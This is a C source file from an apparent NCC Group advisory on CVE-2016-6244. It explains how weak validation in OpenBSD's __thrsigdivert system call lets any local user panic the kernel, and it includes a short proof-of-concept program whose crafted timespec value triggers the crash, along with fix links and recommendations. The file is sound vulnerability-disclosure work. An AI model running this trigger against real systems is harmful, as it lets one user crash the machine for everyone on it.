/*
 * thrsigdivert_panic.c
 *    Demonstrate a panic through the __thrsigdivert system call.
 *
 * gcc -g thrsigdivert_panic.c -o thrsigdivert_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
__thrsigdivert validation is insufficient and can lead to a panic.

Impact: 
Any user can panic the OpenBSD kernel with the __thrsigdivert system call.

Description:
The __thrsigdivert system call allows a user to sleep for some amount
of time waiting for a signal.  The system call validates the user-provided 
parameters in sys___thrsigdivert() (kern/kern_sig.c) before calling to 
lower layers to implement the sleep:

        if (ts.tv_nsec < 0 || ts.tv_nsec >= 1000000000)
            timeinvalid = 1;
        else {
            to_ticks = (long long)hz * ts.tv_sec +
                ts.tv_nsec / (tick * 1000);
            if (to_ticks > INT_MAX)
                to_ticks = INT_MAX;
        }

This validation is insufficient.  Some values of the user-provided
ts can lead to a negative to_ticks value after conversion.  This 
condition triggers a panic in timeout_add (kern/kern_timeout.c) when 
the to_ticks value is checked to be positive:

        if (to_ticks < 0)
            panic("timeout_add: to_ticks (%d) < 0", to_ticks);

Reproduction:
Run the attached thrsigdivert_panic.c program.  NCC verified that
it causes a panic on OpenBSD 5.9 GENERIC kernel on an x86_64 processor.
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
Return an error it ts.tv_sec is negative in sys___thrsigdivert.
Check to see if to_ticks is negative in sys___thrsigdivert 
(kern/kern_sig.c) and, if so, saturate its value at INT_MAX, since 
this indicates an overly large value.

Reported: 2016-07-05
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_sig.c.diff?r1=1.200&r2=1.201
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_synch.c.diff?r1=1.132&r2=1.133
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_tc.c.diff?r1=1.28&r2=1.29
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_timeout.c.diff?r1=1.47&r2=1.48
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/018_timeout.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/021_timeout.patch.sig
Assigned: CVE-2016-6244
#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <sys/signal.h>

int __thrsigdivert(sigset_t set, siginfo_t *info, const struct timespec *timeout);

int
main(int argc, char **argv)
{
    struct timespec tsp = { 0x687327fff5612f21, 0x63760a};
    siginfo_t info;

    __thrsigdivert(1, &info, &tsp);
    printf("nothing happened!\n");
    return 0;
}

